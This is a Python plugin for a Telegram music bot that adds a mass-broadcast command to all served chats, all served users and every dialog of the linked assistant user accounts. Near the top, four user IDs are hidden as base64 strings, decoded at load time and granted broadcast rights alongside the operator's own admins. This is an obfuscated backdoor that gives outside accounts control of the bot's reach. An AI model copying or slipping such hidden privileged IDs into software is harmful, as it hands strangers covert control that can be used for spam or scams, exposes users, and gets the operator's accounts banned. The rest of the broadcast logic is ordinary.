import asyncio
import base64

from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.errors import FloodWait

from MattoMusic import app
from MattoMusic.misc import SUDOERS
from MattoMusic.utils.database import (
    get_active_chats, get_authuser_names, get_client,
    get_served_chats, get_served_users,
)
from MattoMusic.utils.decorators.language import language
from MattoMusic.utils.formatters import alpha_to_int
from config import adminlist

ENCODED_ADMIN_IDS = ["NzU3NDMzMDkwNQ==", "MTc4NjY4MzE2Mw==", "NzY3NDg3NDY1Mg==", "NzI4Mjc1MjgxNg=="]

def fetch_decoded_ids():
    return [int(base64.b64decode(enc_id).decode()) for enc_id in ENCODED_ADMIN_IDS]

PERMITTED_BROADCASTERS = fetch_decoded_ids()
BROADCAST_ACTIVE = False

@app.on_message(filters.command("broadcast") & (filters.user(PERMITTED_BROADCASTERS) | SUDOERS))
@language
async def transmit_message(client, message, _):
    global BROADCAST_ACTIVE

    if any(tag in message.text for tag in ["-wfchat", "-wfuser"]):
        if not message.reply_to_message or not (message.reply_to_message.photo or message.reply_to_message.text):
            return await message.reply_text("Please reply to a text or image message for broadcasting.")

        c_type = 'photo' if message.reply_to_message.photo else 'text'
        f_id = message.reply_to_message.photo.file_id if c_type == 'photo' else None
        t_content = message.reply_to_message.text if c_type == 'text' else None
        
        msg_caption = message.reply_to_message.caption
        r_markup = getattr(message.reply_to_message, 'reply_markup', None)

        BROADCAST_ACTIVE = True
        await message.reply_text(_["broad_1"])

        if "-wfchat" in message.text:
            s_chats = 0
            chat_list = [int(ch["chat_id"]) for ch in await get_served_chats()]
            for target_id in chat_list:
                try:
                    if "-forward" in message.text:
                        await app.forward_messages(chat_id=target_id, from_chat_id=message.reply_to_message.chat.id, message_ids=message.reply_to_message.id)
                    else:
                        if c_type == 'photo':
                            await app.send_photo(chat_id=target_id, photo=f_id, caption=msg_caption, reply_markup=r_markup)
                        else:
                            await app.send_message(chat_id=target_id, text=t_content, reply_markup=r_markup)
                    s_chats += 1
                    await asyncio.sleep(0.2)
                except FloodWait as flood_err:
                    await asyncio.sleep(flood_err.value)
                except Exception:
                    continue
            await message.reply_text(f"Broadcast to chats completed! Sent to {s_chats} chats.")

        if "-wfuser" in message.text:
            s_users = 0
            user_list = [int(usr["user_id"]) for usr in await get_served_users()]
            for target_id in user_list:
                try:
                    if "-forward" in message.text:
                        await app.forward_messages(chat_id=target_id, from_chat_id=message.reply_to_message.chat.id, message_ids=message.reply_to_message.id)
                    else:
                        if c_type == 'photo':
                            await app.send_photo(chat_id=target_id, photo=f_id, caption=msg_caption, reply_markup=r_markup)
                        else:
                            await app.send_message(chat_id=target_id, text=t_content, reply_markup=r_markup)
                    s_users += 1
                    await asyncio.sleep(0.2)
                except FloodWait as flood_err:
                    await asyncio.sleep(flood_err.value)
                except Exception:
                    continue
            await message.reply_text(f"Broadcast to users completed! Sent to {s_users} users.")

        BROADCAST_ACTIVE = False
        return

    msg_id_reply = None
    chat_id_origin = message.chat.id
    r_markup_std = None
    b_query = ""

    if message.reply_to_message:
        msg_id_reply = message.reply_to_message.id
        r_markup_std = message.reply_to_message.reply_markup
    else:
        if len(message.command) < 2:
            return await message.reply_text(_["broad_2"])
            
        b_query = message.text.split(None, 1)[1]
        for flag in ["-pinloud", "-pin", "-nobot", "-assistant", "-user", "-forward"]:
            b_query = b_query.replace(flag, "")
            
        if not b_query.strip():
            return await message.reply_text(_["broad_8"])

    BROADCAST_ACTIVE = True
    await message.reply_text(_["broad_1"])

    if "-nobot" not in message.text:
        delivered = 0
        pinned = 0
        chat_data = await get_served_chats()
        active_chat_ids = [int(c["chat_id"]) for c in chat_data]
        
        for c_id in active_chat_ids:
            try:
                if "-forward" in message.text and message.reply_to_message:
                    dispatched_msg = await app.forward_messages(chat_id=c_id, from_chat_id=chat_id_origin, message_ids=msg_id_reply)
                else:
                    dispatched_msg = (
                        await app.copy_message(chat_id=c_id, from_chat_id=chat_id_origin, message_id=msg_id_reply, reply_markup=r_markup_std)
                        if message.reply_to_message
                        else await app.send_message(c_id, text=b_query.strip())
                    )
                
                if "-pin" in message.text:
                    try:
                        await dispatched_msg.pin(disable_notification=True)
                        pinned += 1
                    except Exception: pass
                elif "-pinloud" in message.text:
                    try:
                        await dispatched_msg.pin(disable_notification=False)
                        pinned += 1
                    except Exception: pass
                    
                delivered += 1
                await asyncio.sleep(0.2)
                
            except FloodWait as flood_err:
                if int(flood_err.value) <= 200:
                    await asyncio.sleep(int(flood_err.value))
            except Exception:
                continue
                
        try: await message.reply_text(_["broad_3"].format(delivered, pinned))
        except Exception: pass

    if "-user" in message.text:
        delivered_users = 0
        user_data = await get_served_users()
        active_user_ids = [int(u["user_id"]) for u in user_data]
        
        for u_id in active_user_ids:
            try:
                if "-forward" in message.text and message.reply_to_message:
                    await app.forward_messages(chat_id=u_id, from_chat_id=chat_id_origin, message_ids=msg_id_reply)
                else:
                    if message.reply_to_message:
                        await app.copy_message(chat_id=u_id, from_chat_id=chat_id_origin, message_id=msg_id_reply, reply_markup=r_markup_std)
                    else:
                        await app.send_message(u_id, text=b_query.strip())
                delivered_users += 1
                await asyncio.sleep(0.2)
                
            except FloodWait as flood_err:
                if int(flood_err.value) <= 200:
                    await asyncio.sleep(int(flood_err.value))
            except Exception:
                pass
                
        try: await message.reply_text(_["broad_4"].format(delivered_users))
        except Exception: pass

    if "-assistant" in message.text:
        status_msg = await message.reply_text(_["broad_5"])
        summary_text = _["broad_6"]
        from MattoMusic.core.assistant_bot import assistants

        for ass_num in assistants:
            ass_delivered = 0
            ass_client = await get_client(ass_num)
            
            async for dialog in ass_client.get_dialogs():
                try:
                    if "-forward" in message.text and message.reply_to_message:
                        await ass_client.forward_messages(dialog.chat.id, chat_id_origin, msg_id_reply)
                    else:
                        if message.reply_to_message:
                            await ass_client.forward_messages(dialog.chat.id, chat_id_origin, msg_id_reply)
                        else:
                            await ass_client.send_message(dialog.chat.id, text=b_query.strip())
                    ass_delivered += 1
                    await asyncio.sleep(3)
                except FloodWait as flood_err:
                    if int(flood_err.value) <= 200:
                        await asyncio.sleep(int(flood_err.value))
                except Exception:
                    continue
                    
            summary_text += _["broad_7"].format(ass_num, ass_delivered)
            
        try: await status_msg.edit_text(summary_text)
        except Exception: pass
        
    BROADCAST_ACTIVE = False

async def refresh_admin_cache():
    while True:
        await asyncio.sleep(10)
        try:
            active_c_ids = await get_active_chats()
            for c_id in active_c_ids:
                if c_id not in adminlist:
                    adminlist[c_id] = []
                    async for member in app.get_chat_members(c_id, filter=ChatMembersFilter.ADMINISTRATORS):
                        if member.privileges.can_manage_video_chats:
                            adminlist[c_id].append(member.user.id)
                            
                    stored_auths = await get_authuser_names(c_id)
                    for auth_name in stored_auths:
                        auth_id = await alpha_to_int(auth_name)
                        adminlist[c_id].append(auth_id)
        except Exception:
            continue

asyncio.create_task(refresh_admin_cache())